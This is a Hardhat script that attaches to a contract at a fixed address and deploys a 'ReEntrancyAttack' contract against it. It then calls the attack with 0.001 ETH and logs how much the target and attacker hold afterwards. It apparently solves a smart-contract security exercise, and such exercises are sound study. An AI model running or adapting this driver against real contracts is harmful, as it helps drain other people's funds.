import { ethers } from "hardhat";
import fs from "fs";
import path from "path";
import { parseEther } from "ethers";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0xFA74343CFb41c69c49De351aDF308EC54EA28863";

  const abiPath = path.join(__dirname, "..", "abis", "reentrancy.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // function call
  const attackContract = await ethers.getContractFactory("ReEntrancyAttack");
  const attack = await attackContract.deploy(instanceAddress);
  await attack.waitForDeployment();
  const attackAddress = await attack.getAddress();
  console.log("Attack Contract deployed:", attackAddress);

  const amount = parseEther("0.001");
  const tx = await attack.attack({
    value: amount,
  });
  await tx.wait();

  const targetBalanceAfter = await ethers.provider.getBalance(instanceAddress);
  console.log(
    "Target ETH balance (after):",
    ethers.formatEther(targetBalanceAfter)
  );

  const attackBalance = await ethers.provider.getBalance(attackAddress);
  console.log("Attack contract balance:", ethers.formatEther(attackBalance));
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
